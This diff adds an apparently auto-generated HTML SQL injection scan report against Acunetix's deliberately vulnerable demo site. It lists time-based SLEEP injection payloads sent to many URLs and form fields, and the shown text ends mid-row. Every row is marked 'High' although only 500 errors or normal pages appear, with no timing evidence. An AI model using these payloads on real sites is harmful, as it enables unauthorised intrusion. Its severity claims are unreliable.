@@ -1,0 +1,2381 @@
+
+        <html>
+        <head>
+            <title>SQL Injection Scan Report</title>
+            <style>
+                body { font-family: Arial; margin: 20px; }
+                table { border-collapse: collapse; width: 100%; }
+                th, td { border: 1px solid #ccc; padding: 8px; }
+                th { background: #f2f2f2; }
+                pre { background: #f9f9f9; border: 1px solid #ccc; padding: 10px; overflow-x: auto; }
+                .response-box { display: none; white-space: pre-wrap; }
+                .toggle-button { cursor: pointer; color: blue; text-decoration: underline; }
+                .vulnerable { background-color: #ffdddd; }
+            </style>
+            <script>
+                function toggle(id) {
+                    var e = document.getElementById(id);
+                    e.style.display = e.style.display === 'block' ? 'none' : 'block';
+                }
+            </script>
+        </head>
+        <body>
+        <h2>SQL Injection Vulnerability Report</h2>
+        <table>
+            <tr>
+                <th>#</th>
+                <th>URL</th>
+                <th>Method</th>
+                <th>Payload</th>
+                <th>Severity</th>
+                <th>Triggered At</th>
+                <th>Response Snippet</th>
+                <th>Full Response</th>
+            </tr>
+        
+                <tr class="vulnerable">
+                    <td>1</td>
+                    <td>http://testasp.vulnweb.com/showforum.asp?id=1</td>
+                    <td>GET</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/showforum.asp?id=%27+OR+SLEEP%285%29--</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_1')">Toggle</span>
+                        <div id="resp_1" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>2</td>
+                    <td>http://testasp.vulnweb.com/showthread.asp?id=0</td>
+                    <td>GET</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/showthread.asp?id=%27+OR+SLEEP%285%29--</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_2')">Toggle</span>
+                        <div id="resp_2" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>3</td>
+                    <td>http://testasp.vulnweb.com/showforum.asp?id=2</td>
+                    <td>GET</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/showforum.asp?id=%27+OR+SLEEP%285%29--</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_3')">Toggle</span>
+                        <div id="resp_3" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>4</td>
+                    <td>http://testasp.vulnweb.com/Search.asp</td>
+                    <td>FORM</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Search.asp</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_4')">Toggle</span>
+                        <div id="resp_4" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>5</td>
+                    <td>http://testasp.vulnweb.com/showthread.asp?id=0</td>
+                    <td>GET</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/showthread.asp?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29%29--</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_5')">Toggle</span>
+                        <div id="resp_5" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>6</td>
+                    <td>http://testasp.vulnweb.com/showforum.asp?id=1</td>
+                    <td>GET</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/showforum.asp?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29%29--</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_6')">Toggle</span>
+                        <div id="resp_6" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>7</td>
+                    <td>http://testasp.vulnweb.com/showforum.asp?id=2</td>
+                    <td>GET</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/showforum.asp?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29%29--</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_7')">Toggle</span>
+                        <div id="resp_7" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>8</td>
+                    <td>http://testasp.vulnweb.com/Search.asp</td>
+                    <td>FORM</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Search.asp</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_8')">Toggle</span>
+                        <div id="resp_8" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>9</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2FSearch%2Easp%3F</td>
+                    <td>GET</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%27+OR+SLEEP%285%29--</td>
+                    <td><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_9')">Toggle</span>
+                        <div id="resp_9" class="response-box"><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>10</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D2</td>
+                    <td>GET</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%27+OR+SLEEP%285%29--</td>
+                    <td><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_10')">Toggle</span>
+                        <div id="resp_10" class="response-box"><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>11</td>
+                    <td>http://testasp.vulnweb.com/showforum.asp?id=0</td>
+                    <td>GET</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/showforum.asp?id=%27+OR+SLEEP%285%29--</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_11')">Toggle</span>
+                        <div id="resp_11" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>12</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2FSearch%2Easp%3F</td>
+                    <td>FORM</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2FSearch%2Easp%3F</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_12')">Toggle</span>
+                        <div id="resp_12" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>13</td>
+                    <td>http://testasp.vulnweb.com/showthread.asp?id=3</td>
+                    <td>GET</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/showthread.asp?id=%27+OR+SLEEP%285%29--</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_13')">Toggle</span>
+                        <div id="resp_13" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>14</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2FSearch%2Easp%3F</td>
+                    <td>GET</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%27+OR+SLEEP%285%29--</td>
+                    <td><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_14')">Toggle</span>
+                        <div id="resp_14" class="response-box"><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>15</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D2</td>
+                    <td>FORM</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D2</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_15')">Toggle</span>
+                        <div id="resp_15" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>16</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D2</td>
+                    <td>GET</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%27+OR+SLEEP%285%29--</td>
+                    <td><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_16')">Toggle</span>
+                        <div id="resp_16" class="response-box"><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>17</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2FSearch%2Easp%3F</td>
+                    <td>GET</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29%29--</td>
+                    <td><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_17')">Toggle</span>
+                        <div id="resp_17" class="response-box"><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>18</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D2</td>
+                    <td>GET</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29%29--</td>
+                    <td><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_18')">Toggle</span>
+                        <div id="resp_18" class="response-box"><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>19</td>
+                    <td>http://testasp.vulnweb.com/showforum.asp?id=0</td>
+                    <td>GET</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/showforum.asp?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29%29--</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_19')">Toggle</span>
+                        <div id="resp_19" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>20</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2FSearch%2Easp%3F</td>
+                    <td>FORM</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2FSearch%2Easp%3F</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_20')">Toggle</span>
+                        <div id="resp_20" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>21</td>
+                    <td>http://testasp.vulnweb.com/showthread.asp?id=3</td>
+                    <td>GET</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/showthread.asp?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29%29--</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_21')">Toggle</span>
+                        <div id="resp_21" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>22</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D2</td>
+                    <td>FORM</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D2</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_22')">Toggle</span>
+                        <div id="resp_22" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>23</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2FSearch%2Easp%3F</td>
+                    <td>FORM</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2FSearch%2Easp%3F</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_23')">Toggle</span>
+                        <div id="resp_23" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>24</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2FSearch%2Easp%3F</td>
+                    <td>GET</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29%29--</td>
+                    <td><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_24')">Toggle</span>
+                        <div id="resp_24" class="response-box"><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>25</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D2</td>
+                    <td>FORM</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D2</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_25')">Toggle</span>
+                        <div id="resp_25" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>26</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D2</td>
+                    <td>GET</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29%29--</td>
+                    <td><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_26')">Toggle</span>
+                        <div id="resp_26" class="response-box"><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>27</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2FSearch%2Easp%3F</td>
+                    <td>FORM</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2FSearch%2Easp%3F</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_27')">Toggle</span>
+                        <div id="resp_27" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>28</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D2</td>
+                    <td>FORM</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D2</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_28')">Toggle</span>
+                        <div id="resp_28" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>29</td>
+                    <td>http://testasp.vulnweb.com/Templatize.asp?item=html/about.html</td>
+                    <td>GET</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Templatize.asp?item=%27+OR+SLEEP%285%29--</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_29')">Toggle</span>
+                        <div id="resp_29" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>30</td>
+                    <td>http://testasp.vulnweb.com/Templatize.asp?item=html/about.html</td>
+                    <td>GET</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Templatize.asp?item=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29%29--</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_30')">Toggle</span>
+                        <div id="resp_30" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>31</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D3</td>
+                    <td>GET</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%27+OR+SLEEP%285%29--</td>
+                    <td><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_31')">Toggle</span>
+                        <div id="resp_31" class="response-box"><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>32</td>
